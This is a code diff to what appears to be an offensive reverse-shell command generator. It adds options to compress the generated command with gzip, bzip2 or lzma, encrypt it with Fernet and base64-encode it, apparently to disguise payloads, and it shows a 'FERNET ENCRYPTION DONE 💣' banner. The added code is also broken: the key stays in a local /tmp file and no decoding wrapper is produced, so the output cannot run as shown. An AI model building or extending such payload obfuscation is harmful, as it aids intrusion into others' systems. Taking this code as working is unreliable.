@@ -3,8 +3,15 @@
 import subprocess
 import base64
 import cryptography
+from cryptography.fernet import Fernet
+import gzip
+import tarfile
 import string
 import sh
+import bz2
+import lzma
+import zlib
+import lz4
 import random
 import ipaddress
 import os
@@ -42,6 +49,12 @@ ip = port = shell = command = base64_encoding = ''
 choices = ['no', 'yes']
 shells = ['/bin/sh', '/bin/bash', '/bin/zsh', '/bin/ksh', '/bin/tcsh', '/bin/dash']
 commands = sorted([command for command in os.listdir(sys.path[0] + '/commands')])
+
+compressions_types = ['gzip', 'bzip2', 'lzma']
+gzip_compression_levels = ['0','1', '2', '3', '4', '5', '6', '7', '8', '9']
+gzip_compression_level = None
+gzip_compression_data = ''
+
 
 
 def print_banner():
@@ -171,6 +184,39 @@ def select_base64_encoding():
     global base64_encoding
     base64_encoding = choices[(select(choices))]
 
+def select_encryption():
+    print(header.safe_substitute(text='SELECT FERNET ENCRYPTION'))
+    # display an info message 'if encryption is enabled that require base64 encoding to be enabled so base64 encoding is enabled by default if you choose to enable encryption'
+    print(info.safe_substitute(text='If encryption is enabled that require base64 encoding to be enabled so base64 encoding is enabled by default if you choose to enable encryption'))
+    global encryption
+    encryption = choices[(select(choices))]
+    # enable base64 encoding if encryption is enabled
+    if encryption == 'yes':
+        global base64_encoding
+        base64_encoding = 'yes'
+
+def select_compression():
+    print(header.safe_substitute(text='SELECT COMPRESSION'))
+    # display an info message 'if compression is enabled that require base64 encoding to be enabled so base64 encoding is enabled by default if you choose to enable compression'
+    print(info.safe_substitute(text='If compression is enabled that require base64 encoding to be enabled so base64 encoding is enabled by default if you choose to enable compression'))
+    global compression
+    compression = choices[(select(choices))]
+    # enable base64 encoding if compression is enabled
+    if compression == 'yes':
+        global base64_encoding
+        base64_encoding = 'yes'
+
+def select_compressions_types(selected_compression):
+    if selected_compression == 'yes':
+        print(header.safe_substitute(text='SELECT COMPRESSION TYPE'))
+        global compressions_types
+        compressions_types = compressions_types[(select(compressions_types))]
+        if compressions_types == 'gzip':
+            print(header.safe_substitute(text='SELECT COMPRESSION LEVEL'))
+            global gzip_compression_level
+            gzip_compression_level = gzip_compression_levels[(select(gzip_compression_levels))]
+
+
 def test_specified_port_inbound_firewall_localhost():
     print(header.safe_substitute(text='TEST SPECIFIED PORT INBOUND FIREWALL ON LOCALHOST'))
     try:
@@ -231,15 +277,89 @@ def build_command():
     if select(choices) == 1:
         command = urllib.parse.quote_plus(command)
         print(info.safe_substitute(text='Command is now URL encoded!'))
+    
+    if compression == 'yes':
+        # check if compressions_types is 'gzip' or 'bzip2' or 'xz' or 'lzma' or 'lzop' or 'lz4' or 'zstd' and compress command if it is, command is equal to the compressed command
+        if compressions_types == 'gzip':
+            command = gzip.compress(command.encode(), compresslevel=int(gzip_compression_level))
+            print(info.safe_substitute(text='Command is now compressed with gzip!'))
+            print(info.safe_substitute(text=Fore.BLUE+'(gzip)'+Fore.RESET+'Compression level is ' + gzip_compression_level))
+        elif compressions_types == 'bzip2':
+            command = bz2.compress(command.encode())
+            print(info.safe_substitute(text='Command is now compressed with bzip2!'))
+        elif compressions_types == 'lzma':
+            command = lzma.compress(command.encode())
+            print(info.safe_substitute(text='Command is now compressed with xz!'))
+        # lzop is not supported by python 3.6, so it is not included in the list of compressions_types
+        # zstd is not supported by python 3.6, so it is not included in the list of compressions_types
+        else:
+            print(fail.safe_substitute(text='Compression type is not supported!'))
+            print(fail.safe_substitute(text='Command is not compressed!'))
+            print(fail.safe_substitute(text='Command is not compressed with gzip!'))
+            print(fail.safe_substitute(text='Command is not compressed with bzip2!'))
+            print(fail.safe_substitute(text='Command is not compressed with lzma!'))
+            # print error message 'Compression type is not supported, so you can\'t use it' in red color with system to terminal
+            print(Fore.RED + 'Compression type is not supported, so you can\'t use it')
+            print(Fore.RESET)
+            exit(1)
+    else:
+        print(info.safe_substitute(text='Command is not compressed!'))
+    
+    # encryption with fernet if encryption is 'yes'
+    if encryption == 'yes':
+        # generate key
+        # key is generated with Fernet.generate_key() and is equal to the key
+        # print an message 'Fernet key generating...' in yellow color with system to terminal
+        print(Fore.YELLOW + 'Fernet key generating...')
+        print(Fore.RESET)
+        key = Fernet.generate_key()
+        # print an message 'Fernet key generated!' in green color with system to terminal
+        print(Fore.GREEN + 'Fernet key generated!')
+        print(Fore.RESET)
+        # encode command with the str function .encode() if is an string and not bytes encoded
+        if isinstance(command, str):
+            command = command.encode()
+        # initailize fernet with key
+        f = Fernet(key)
+        # print an message 'Fernet key is now used to encrypt command! 🔑' in green color with system to terminal
+        print(Fore.GREEN + 'Fernet key is now used to encrypt command! 🔑')
+        print(Fore.RESET)
+        # print 'Fernet encryption...' in yellow color with system to terminal
+        print(Fore.YELLOW + 'Fernet encryption...')
+        print(Fore.RESET)
+        # encrypt command with Fernet.encrypt() and is equal to the encrypted command
+        token = f.encrypt(command)
+        # print an message 'Command is now encrypted!' in green color with system to terminal
+        print(Fore.GREEN + 'Command is now encrypted!')
+        print(Fore.RESET)
+        # create an random named tmp file with the random function random.randint() and is equal to the random_file_name, prefix is '/tmp/' and suffix is '.key'
+        random_file_name = '/tmp/' + str(random.randint(1, 1000000)) + '.key'
+        # print an message 'Key file name is ' + random_file_name + '!' in green color with system to terminal
+        print(Fore.GREEN + 'Key file name is ' + random_file_name + '!')
+        print(Fore.RESET)
+        # write key to random_file_name
+        with open(random_file_name, 'wb') as f:
+            f.write(key)
+        # print an message 'Key file is now created!' in green color with system to termina
+        print(Fore.GREEN + 'Key file is now created!')
+        print(Fore.RESET)
+        # display an symbol 'FERNET ENCRYPTION DONE 💣' in red color with system to terminal
+        print(Fore.RED + 'FERNET ENCRYPTION DONE 💣')
+        print(Fore.RESET)
+
+
+
+    # encode command if is an string and not bytes encoded
+    if isinstance(command, str):
+            command = command.encode()
 
     # base64 encode of command if base64_encoding is 'yes'
-    if base64_encoding == 'yes':
-        command = base64.b64encode(command.encode()).decode()
+    if base64_encoding == 'yes' or encryption == 'yes' or compression == 'yes':
+        command = base64.b64encode(command).decode()
         print(info.safe_substitute(text='Command is now base64 encoded!'))
     # if base64_encoding is 'no' do nothing, print command as is without base64 encoding
     else:
         print(info.safe_substitute(text='Command is not base64 encoded!'))
-    
 
     print(header.safe_substitute(text='FINISHED COMMAND'))
     print(code.safe_substitute(code=command) + '\n')
@@ -277,7 +397,10 @@ if __name__ == '__main__':
             print(Fore.RESET)
         select_command()
         select_shell()
-        select_base64_encoding()
+        select_compression()
+        select_compressions_types(compression)
+        select_encryption()
+        if base64_encoding!='yes': select_base64_encoding()
         build_command()
         setup_listener()
     except KeyboardInterrupt:
